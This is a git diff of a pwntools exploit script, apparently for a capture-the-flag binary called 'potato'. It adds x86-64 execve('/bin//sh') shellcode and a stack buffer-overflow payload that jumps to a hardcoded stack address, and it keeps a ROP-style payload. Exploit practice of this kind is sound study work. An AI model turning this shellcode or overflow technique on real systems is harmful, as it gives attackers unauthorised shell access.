@@ -4,7 +4,7 @@ from pwn import *
 import sys
 
 
-context.terminal = ["kitty", "sh", "-c"]
+# context.terminal = ["kitty", "sh", "-c"]
 
 elf = ELF("./potato")
 
@@ -25,14 +25,16 @@ print(p.recvuntil(b"cmd> ")) # username
 p.sendline(b"changename")
 
 shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+# shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
 
 # payload=b"\x41"*72 + p64(0x4045ca)
 # payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf'
 # payload = b'abc'
 # payload = b'\x41' * 50
 # payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd2c0)
+payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd9b0)
 # payload = b'\x41' * 72 + p64(0xffffffffffffffff)
-payload = b''.join([b'\x41'*64, p64(0x00007fffffffd480), p64(0x155554aeef10), p64(0x155554a47ba0), p64(0x4088c7)])
+payload = b''.join([b'\x41'*64, p64(0x7fffffffd480), p64(0x155554aeef10), p64(0x155554a47ba0), p64(0x4088c7)])
 
 p.sendline(payload)
 #p.recvline_startswith(b"cmd>")
